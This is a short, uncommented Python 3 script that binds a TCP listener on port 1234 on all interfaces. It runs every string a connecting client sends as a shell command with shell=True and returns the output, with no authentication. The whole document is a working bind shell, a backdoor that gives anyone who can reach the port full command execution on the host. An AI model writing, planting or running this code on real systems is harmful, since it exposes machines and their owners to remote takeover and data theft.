#!/usr/bin/python3
import socket
import subprocess
PORT = 1234        # Choose an unused port
print ("Waiting for Remote connections on port:", PORT, "\n")
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(('', PORT))
server.listen()
while True:
    conn, addr = server.accept()
    with conn:
        print('Connected by', addr)
        while True:
            data = conn.recv(1024).decode()
            if not data:
                break
            proc = subprocess.Popen(data.strip(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            output, err = proc.communicate()
            response = output.decode() + err.decode()
            conn.sendall(response.encode())
server.close()
